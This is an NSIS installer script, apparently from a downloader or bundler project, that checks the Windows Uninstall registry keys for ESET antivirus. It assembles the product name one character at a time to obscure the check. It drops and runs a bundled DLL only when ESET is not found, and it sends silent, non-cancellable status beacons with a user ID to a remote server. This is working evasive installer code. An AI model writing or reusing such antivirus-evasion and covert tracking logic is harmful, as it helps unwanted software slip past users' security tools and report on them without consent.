!include StrContains.nsh

!define NOTDETECTEDESET "false"
!define DETECTEDESET "true"


Var EsetName
Var addRemoveItem
Var EsetDetectedItem
Var FindRes

Function ESETDetectionItem
	;StrCpy $EsetDetectedItem "no"
	StrCpy $EsetDetectedItem "false"
	;ESET
	StrCpy $EsetName "T"
	StrCpy $EsetName "E$EsetName"
	StrCpy $EsetName "S$EsetName"
	StrCpy $EsetName "E$EsetName"
	${StrContains} $FindRes "$EsetName" "$addRemoveItem" 
	${if} $FindRes != ""
		;StrCpy $EsetDetectedItem "yes"
		StrCpy $EsetDetectedItem "true"
	${endif}
FunctionEnd

Var Iterator
Var UninstallKey

Function CheckEset
	StrCpy $EsetFound "false"
	
	StrCpy $EsetDetectedItem "false"
	
	StrCpy $Iterator 0
loop1:
  EnumRegKey $uninstallKey HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" $Iterator
  StrCmp $uninstallKey "" done1
	ReadRegStr $addRemoveItem HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$uninstallKey" "DisplayName"
	${if} $addRemoveItem != ""
		;StrCpy $9 "$9$\r$\n$addRemoveItem"
		Call ESETDetectionItem
		
		${if} $EsetDetectedItem == "true"
				;StrCpy $EsetFound "yes" 
				StrCpy $EsetFound "true" 
		${endif} 
	${endif} 
	IntOp $Iterator $Iterator + 1
 	Goto loop1
done1:
	
	;MessageBox MB_OK "HKLM 32 $9" 
	;StrCpy $9 ""

	StrCpy $Iterator 0
loop2:
  EnumRegKey $uninstallKey HKCU "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" $Iterator
  StrCmp $uninstallKey "" done2
	ReadRegStr $addRemoveItem HKCU "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$uninstallKey" "DisplayName"
	${if} $addRemoveItem != ""
		;StrCpy $9 "$9$\r$\n$addRemoveItem"
		Call ESETDetectionItem
		;${if} $EsetDetectedItem == "yes"
		${if} $EsetDetectedItem == "true"
				;StrCpy $EsetFound "yes" 
				StrCpy $EsetFound "true" 
		${endif} 
	${endif} 
	IntOp $Iterator $Iterator + 1
 	Goto loop2
done2:

	;MessageBox MB_OK "HKCU $9" 
	;StrCpy $9 ""

	# получим разрядность
	System::Call "kernel32::GetCurrentProcess() i .s"
	System::Call "kernel32::IsWow64Process(i s, *i .r0)"
	${if} $0 == 1
		SetRegView 64
		StrCpy $Iterator 0		
		loop3:
			
			EnumRegKey $uninstallKey HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" $Iterator
			StrCmp $uninstallKey "" done3
			ReadRegStr $addRemoveItem HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$uninstallKey" "DisplayName"
			
			${if} $addRemoveItem != ""
				;StrCpy $9 "$9$\r$\n$addRemoveItem"
				Call ESETDetectionItem
				;${if} $EsetDetectedItem == "yes"
				${if} $EsetDetectedItem == "true"
					;StrCpy $EsetFound "yes" 
					StrCpy $EsetFound "true" 
				${endif} 
			${endif} 
			IntOp $Iterator $Iterator + 1
			Goto loop3
		done3:
		SetRegView 32
		;MessageBox MB_OK "HKLM 64 $9" 
	${endif}
	Push $EsetFound
FunctionEnd
Function InitDll
	
	StrCpy $ReportUrl "https://$MainDomain/installer.php?CODE=PUTGQ&UID=$1&action="
	StrCpy $Result "2080"
	Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
	Pop $0
	Pop $stack
	
	StrCpy $DllPath "$PLUGINSDIR"
	
	${if} $EsetFound == "false"
		File /oname=$PLUGINSDIR\${utilites}.dll		"D:\Regular.Downloader\AutoCompile\Source\${utilites}.dll"
	${endif}
	StrCpy $Result "2081"
	Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
	Pop $0
	Pop $stack
FunctionEnd


Function CheckDlls
	
	StrCpy $0 ""
	CallInstDLL $DllPath\${utilites}.dll /NOUNLOAD ${Init}
	Pop $0
	${if} $0 == "ok"
		StrCpy $Result "2071"
		Banner::get /NOUNLOAD /TOSTACK /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
		Pop $0
		Pop $stack
	${else}
		StrCpy $Result "2072"
		Banner::get /NOUNLOAD /TOSTACK /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
		Pop $0
		Pop $stack
	${endif}
	

FunctionEnd
